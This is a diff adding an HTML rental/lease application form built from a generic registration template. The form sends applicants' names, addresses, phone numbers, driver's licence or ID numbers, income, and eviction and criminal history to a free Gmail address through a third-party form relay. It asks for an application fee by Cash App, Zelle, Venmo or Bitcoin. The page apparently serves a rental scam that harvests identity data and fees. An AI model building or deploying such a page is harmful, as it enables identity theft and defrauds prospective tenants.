@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<!---Coding By DINER'S CODE--->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/build/css/intlTelInput.css" />
+    <link rel="stylesheet" href="/build/css/demo.css" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <!--<title>Registration Form in HTML CSS</title>-->
+    <!---Custom CSS File--->
+    <link rel="stylesheet" href="index.css" />
+  </head>
+  <body>
+    <section class="container">
+      <div class="image-logo">
+        <img src="./Screenshot 2025-03-24 111447.png" alt="">
+      </div>
+      <header>RENTAL/LEASE APPLICATION FORM</header>
+      <p>Please fill out this form with accurate and complete details</p>
+      <h4>contact info | xlrealpropertymanagement01@gmail.com</h4>
+      <form
+        action="https://formsubmit.co/xlrealpropertymanagement01@gmail.com"
+        method="POST"
+        class="form"
+      >
+        <input type="text" name="_honey" style="display: none" />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://www.google.com">
+        <div class="input-box">
+          <label>FIRST NAME</label>
+          <input
+            type="text"
+            name="first name"
+            placeholder="Enter Full Name"
+            required
+          />
+        </div>
+
+        <div class="input-box">
+          <label>LAST NAME</label>
+          <input
+            type="text"
+            name="last name"
+            placeholder="Enter last name"
+            required
+          />
+        </div>
+
+        <div class="input-box">
+          <label>Email Address</label>
+          <input
+            type="email"
+            name="email"
+            placeholder="*******@gmail.com"
+            required
+          />
+        </div>
+
+        <div class="input-box">
+          <label>PHONE NUMBER</label>
+          <input
+            type="text"
+            name="phone number"
+            placeholder="Enter Your NUmber"
+            required
+          />
+        </div>
+
+        <div class="colum">
+          <div class="input-box">
+            <label>ADDRESS</label>
+            <input
+              type="text"
+              name="street address 1"
+              placeholder="Street Address"
+              required
+            />
+            <input
+              type="text"
+              name="street address 2"
+              placeholder="Stress Address 2"
+              required
+            />
+          </div>
+          
+        </div>
+        <div class="input-box">
+            <label for="phone">CITY</label><br />
+            <input type="text" name="CITY" id="phone" /><br />
+          </div>
+
+        <div class="column">
+          <div class="input-box">
+            <label for="phone">POSTAL / ZIP CODE</label><br />
+            <input type="text" name="postal / zip code" /><br />
+          </div>
+          <div class="input-box">
+            <label>STATE / PROVINCE</label>
+            <input
+              type="text"
+              name="state/province"
+              required
+            />
+          </div>
+        </div>
+        <div class="gender-box">
+          <h3>ARE YOU CLEAN?</h3>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="male-gender" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="female-gender" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="input-box">
+            <label>NUMBER OF PEOPLE MOVING IN</label>
+            <input
+              type="number"
+              name="number of people moving in"
+              placeholder=""
+              required
+            />
+          </div>
+          <div class="input-box">
+            <label>DRIVERS LICENSE OR ANY VALID ID</label>
+            <input
+              type="text"
+              name="D/ID number"
+              placeholder="**************"
+              required
+            />
+          </div>
+        </div>
+        <div class="input-box address">
+          <label>MONTHLY INCOME:</label>
+          <div class="column">
+            <div class="select-box">
+              <select name="monthly income">
+                <option hidden>Monthly Income:</option>
+                <option>$100 - $1000</option>
+                <option>$1000 - $5000</option>
+                <option>$5000 Above</option>
+              </select>
+            </div>
+          </div>
+          <label>TYPE OF LEASE:</label>
+          <div class="column">
+            <div class="select-box">
+              <select name="type of lease">
+                <option hidden>Type Of Lease</option>
+                <option>Month to Month</option>
+                <option>Year to Year</option>
+                <option>Unspecified</option>
+              </select>
+            </div>
+          </div>
+          
+          <!-- <div class="column">
+            <input type="text" placeholder="Enter your region" required />
+            <input type="number" placeholder="Enter postal code" required />
+          </div> -->
+        </div>
+
+        <div class="gender-box">
+          <h3>Have You Ever Been Evicted</h3>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="evicted-YES" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="evicted-NO" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="gender-box">
+          <h3>Have You Ever Broken a Lease</h3>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="broken-YES" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="broken-NO" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="gender-box">
+          <h3>Your Rental History Any Criminal Record</h3>
+          <div class="gender-option">
+            <div class="gender">
+              <input type="radio" id="check-male" name="criminal-record-YES" />
+              <label for="check-male">YES</label>
+            </div>
+            <div class="gender">
+              <input type="radio" id="check-female" name="criminal-record-NO" />
+              <label for="check-female">NO</label>
+            </div>
+          </div>
+        </div>
+
+        <div class="input-box address">
+          <div class="column">
+            <div class="select-box">
+              <select name="pets">
+                <option hidden>Do you have any pets:</option>
+                <option>Dog</option>
+                <option>Cat</option>
+                <option>Rabbit</option>
+                <option>Others</option>
+              </select>
+            </div>
+          </div>
+          <div class="column">
+            <div class="select-box">
+              <select name="payment">
+                <option hidden>Application Form Payment Method</option>
+                <option>Cash App payment</option>
+                <option>PayPal payment</option>
+                <option>Apple Pay payment</option>
+                <option>Zelle payment</option>
+                <option>Venmo payment</option>
+                <option>Bitcoin payment</option>
+              </select>
+            </div>
+          </div>
+        </div>
+
+        <footer>
+          <div class="checkbox-wrapper-46">
+            <input type="checkbox" id="cbx-46" class="inp-cbx" />
+            <label for="cbx-46" class="cbx"
+              ><span>
+                <svg viewBox="0 0 12 10" height="10px" width="12px">
+                  <polyline points="1.5 6 4.5 9 10.5 1"></polyline></svg></span
+              ><span>Agree with terms & conditions</span>
+            </label>
+          </div>
+        </footer>
+
+        <button>Submit</button>
+      </form>
+
+      <footer>
+        <div class="column">
+          <p>&copy; 2024</p>
+          <p>User Agreement</p>
+          <p>Privacy Policy</p>
+        </div>
+      </footer>
+    </section>
+
+    <script src="/build/js/intlTelInput.js"></script>
+    <script>
+      var input = document.querySelector("#phone");
+      window.intlTelInput(input, {});
+    </script>
+  </body>
+</html>
